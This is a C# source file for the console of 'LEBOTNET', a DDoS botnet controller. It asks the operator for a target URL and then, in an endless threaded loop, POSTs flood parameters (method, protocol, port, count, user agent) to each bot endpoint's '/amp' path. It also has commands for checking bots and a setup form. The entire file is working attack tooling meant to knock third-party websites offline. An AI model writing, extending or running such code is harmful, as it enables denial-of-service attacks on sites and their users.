using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Drawing.Printing;
using System.Threading.Tasks;
using System.Linq;
using System.Text.Json;

namespace Lebot_Starter
{

    class Program
    {

        private const int MF_BYCOMMAND = 0x00000000;
        public const int SC_CLOSE = 0xF060;
        public const int SC_MINIMIZE = 0xF020;
        public const int SC_MAXIMIZE = 0xF030;
        public const int SC_SIZE = 0xF000;

        [DllImport("user32.dll")]
        public static extern int DeleteMenu(IntPtr hMenu, int nPosition, int wFlags);

        [DllImport("user32.dll")]
        private static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);

        [DllImport("kernel32.dll", ExactSpelling = true)]
        private static extern IntPtr GetConsoleWindow();

        static void Main(string[] args) => dassmain();
        static public void dassmain()
        {
            Lebot_Starter.discord_rpc.Initialize();

            IntPtr handle = GetConsoleWindow();
            IntPtr sysMenu = GetSystemMenu(handle, false);

            if (handle != IntPtr.Zero)
            {
                DeleteMenu(sysMenu, SC_MINIMIZE, MF_BYCOMMAND);
                DeleteMenu(sysMenu, SC_MAXIMIZE, MF_BYCOMMAND);
                DeleteMenu(sysMenu, SC_SIZE, MF_BYCOMMAND);
            }
            string path_dir = Directory.GetCurrentDirectory();

            Console.ForegroundColor = ConsoleColor.Blue;
            Console.BackgroundColor = ConsoleColor.Black;

            System.Net.WebClient wc = new System.Net.WebClient();
            string result = "Your Replit Links";
            var ep_s = Regex.Split(result.ToString(), "\r\n|\r|\n");    


            var eps = Int32.Parse(ep_s.Length.ToString());
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("                 ╔════════════════════════════════════════════════════════════════════════════════════╗");
            Console.WriteLine("                 ║                                                                                    ║");
            Console.WriteLine("                 ║                        ██▓    ▓█████  ▄▄▄▄    ▒█████  ▄▄▄█████▓                    ║");
            Console.WriteLine("                 ║                       ▓██▒    ▓█   ▀ ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒                    ║");
            Console.WriteLine("                 ║                       ▒██░    ▒███   ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░                    ║");
            Console.WriteLine("                 ║                       ▒██░    ▒▓█  ▄ ▒██░█▀  ▒██   ██░░ ▓██▓ ░                     ║");
            Console.WriteLine("                 ║                       ░██████▒░▒████▒░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░                     ║");
            Console.WriteLine("                 ║                       ░ ▒░▓  ░░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░                       ║");
            Console.WriteLine("                 ║                       ░ ░ ▒  ░ ░ ░  ░▒░▒   ░   ░ ▒ ▒░     ░                        ║");
            Console.WriteLine("                 ║                         ░ ░      ░    ░    ░ ░ ░ ░ ▒    ░                          ║");
            Console.WriteLine("                 ║                           ░  ░   ░  ░ ░          ░ ░                               ║");
            Console.WriteLine("                 ║                                                     ░                              ║");
            Console.WriteLine("                 ║   ────────────────────────────────── LEBOTNET ──────────────────────────────────   ║");
            Console.WriteLine("                 ║                               © Copyright 2022 Lebot                               ║");
            Console.WriteLine("                 ║                                                                                    ║");
            Console.WriteLine("                 ║                             Bots On The NET: " + eps + " Bots                              ║");

            if (File.Exists(path_dir + "\\modules\\modules.json"))
            {
            }
            else
            {
                Console.WriteLine("                 ║                                                                                    ║");
                Console.WriteLine("                 ║                            Please Run The Setup Command!                           ║");
                Console.WriteLine("                 ║                     reload command to reload the application                       ║");

            }
            Console.WriteLine("                 ║                                                                                    ║");
            Console.WriteLine("                 ║                                Type help for help!                                 ║");
            Console.WriteLine("                 ╚════════════════════════════════════════════════════════════════════════════════════╝");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Lebot@Lebot:~# ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Title = "Lebot | Bots: " + eps;

            if (File.Exists(path_dir + "\\modules\\modules.json"))
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                string ur = Console.ReadLine();
                if (File.Exists(path_dir + "./modules/modules.json"))
                {
                    if (ur == "start botnet" || ur == "Start botnet")
                    {
                        Console.Clear();
                        string text = File.ReadAllText(@"./modules/modules.json");
                        var modules = JsonSerializer.Deserialize<modules>(text);
                        Console.Write("Target Url: ");
                        string url = Console.ReadLine();
                        Console.Clear();
                        int request_total = 0;
                        Console.WriteLine("");
                        Console.WriteLine("                             Sending bots too: " + url);
                        Console.WriteLine("   ╔═══════════════════════════════════════════════════════════════════════════════════╗");
                        Console.WriteLine("   ║                         Thank You For Using Our BOTNET!                           ║");
                        Console.WriteLine("   ║                         Control + C to stop the attack!                           ║");
                        Console.WriteLine("   ║                                                                                   ║");
                        Console.WriteLine("   ║                                     Config:                                       ║");
                        Console.WriteLine("   ║                                 method:   " + modules.method + "                                      ║");
                        Console.WriteLine("   ║                                                                                   ║");
                        Console.WriteLine("   ║                                                                                   ║");
                        Console.WriteLine("   ╚═══════════════════════════════════════════════════════════════════════════════════╝");
                        while (true)
                        {
                            foreach (string ep in ep_s)
                            {
                                new Thread(() => send(ep, url, eps.ToString(), request_total, url)).Start();
                                Thread.Sleep(35);
                                request_total += 1;
                            }
                        }
                    }
                    else if (ur == "start bots" || ur == "Start bots")
                    {
                        foreach (string ep in ep_s)
                        {
                            Task.Run(() =>
                            {
                                try
                                {

                                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(ep);
                                    req.Timeout = 5000;
                                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();

                                }
                                catch (Exception e)
                                {
                                    e.ToString();
                                    return;
                                }
                            });
                            Thread.Sleep(5);
                        }
                        dassmain();

                    }
                    else if (ur == "get info" || ur == "get info")
                    {
                        
                    }
                    else if (ur == "help" || ur == "Help")
                    {
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine("  Start botnet | Start the botnet service.");
                        Console.WriteLine("  Config       | Opens the Config Module.");
                        Console.WriteLine("  Start bots   | Checks all bots.");
                        Console.WriteLine(" ");
                        Console.WriteLine("  Help Closes in 5 Seconds.");
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Thread.Sleep(5000);
                        Console.Clear();
                        dassmain();
                    }
                    else if (ur == "reload" || ur == "Reload")
                    {
                        System.Diagnostics.Process.Start(System.AppDomain.CurrentDomain.FriendlyName);
                        Environment.Exit(0);
                    }
                    else if (ur == "config" || ur == "Config")
                    {
                        Application.EnableVisualStyles();
                        Application.SetCompatibleTextRenderingDefault(false);
                        Application.Run(new Form1());
                    }
                    else if (ur.StartsWith("ls") || ur.StartsWith("apt") || ur.StartsWith("wget") || ur.StartsWith("curl") || ur.StartsWith("curl"))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("  " + ur + " is A linux command! You cannt use it here. ");
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Thread.Sleep(2000);
                        Console.Clear();
                        dassmain();
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine(ur + " not found! type help to see how to use it!");
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Thread.Sleep(2000);
                        Console.Clear();
                        dassmain();
                    }
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine(" Please Use The Setup Command to use the botnet!");
                    Console.WriteLine(" Error Closes in 5 Seconds.");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Thread.Sleep(5000);
                    Console.Clear();
                    dassmain();
                }


            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                string ur = Console.ReadLine();
                Console.ForegroundColor = ConsoleColor.Cyan;

                if (ur == "reload" || ur == "Reload")
                {
                    System.Diagnostics.Process.Start(System.AppDomain.CurrentDomain.FriendlyName);
                    Environment.Exit(0);
                }
                else if (ur == "help" || ur == "Help")
                {
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine("  reload | Reload the config");
                    Console.WriteLine("  setup  | Setup the bot");
                    Console.WriteLine("  Help Closes in 5 Seconds.");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Thread.Sleep(5000);
                    Console.Clear();
                    dassmain();
                }
                else if (ur == "setup" || ur == "Setup")
                {
                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);
                    Application.Run(new Form1());

                }

            }
        }

        static void send(string ep, string url, string eps, int request_total, string url_target)
        {
            
            Console.ForegroundColor = ConsoleColor.Green;
            string text = File.ReadAllText(@"./modules/modules.json");
            var modules = JsonSerializer.Deserialize<modules>(text);

            string data = "method=" + modules.method + "&proto=" + modules.proto + "&l4_pdm="+modules.l4_pdm+"&target=" + url + "&port="+ modules.port + "&count="+modules.count+"&url=" + url + "&useragent=" + modules.useragent;
            try
            {
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(ep+"/amp");
                req.Method = "POST";
                req.Timeout = 1000;
                req.ContentType = "application/x-www-form-urlencoded";
                req.ContentLength = data.Length;
                req.UserAgent = modules.method;
                StreamWriter writer = new StreamWriter(req.GetRequestStream());
                writer.Write(data);
                writer.Close();
                HttpWebResponse res = (HttpWebResponse)req.GetResponse();
                StreamReader reader = new StreamReader(res.GetResponseStream());
                string response = reader.ReadToEnd();
                reader.Close();
            }
            catch (Exception e)
            {
              e.ToString();
            }

            Console.Title = "Lebot | Bots: " + eps + " | Requests Send: " + request_total.ToString() + " | Target: " + url_target;
        }
    }
}


